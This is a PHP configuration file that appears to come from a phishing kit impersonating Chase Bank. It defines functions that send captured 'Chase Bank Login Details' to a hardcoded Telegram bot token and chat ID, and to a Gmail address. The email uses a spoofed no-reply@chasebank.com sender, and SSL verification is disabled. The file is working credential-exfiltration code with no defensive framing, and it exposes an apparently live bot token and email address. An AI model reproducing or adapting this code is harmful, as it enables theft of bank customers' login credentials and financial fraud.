<?php
// Telegram Configuration
function send_telegram_msg($message) {
    $botToken = '8225481001:AAG41HiuCP1us6r_K33rJaENccFEGtNgDjg';
    $chat_id = ['8456117155'];

	

    $website = "https://api.telegram.org/bot" . $botToken;
    foreach ($chat_id as $ch) {
        $params = [
            'chat_id' => $ch,
            'text' => $message,
        ];
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // Changed to 1 for better return handling
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); // Use http_build_query for proper encoding
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        if ($result === false) {
            error_log("Telegram API error: " . curl_error($ch));
            curl_close($ch);
            return false;
        }
        curl_close($ch);
    }
    return true;
}

// Email Configuration
function send_email_msg($message) {
    // Change this email address to your desired recipient
    $to = 'lizzy142279@gmail.com'; // Replace with your email address
    $subject = 'Chase Bank Login Details - ' . date('D M d, Y h:i A T'); // e.g., Mon Oct 20, 2025 10:57 PM WAT
    $headers = "From: no-reply@chasebank.com\r\n"; // Change domain as needed
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // Send email
    $result = @mail($to, $subject, $message, $headers);
    if ($result === false) {
        error_log("Email delivery failed: Check server mail configuration");
        return false;
    }
    return true;
}
?>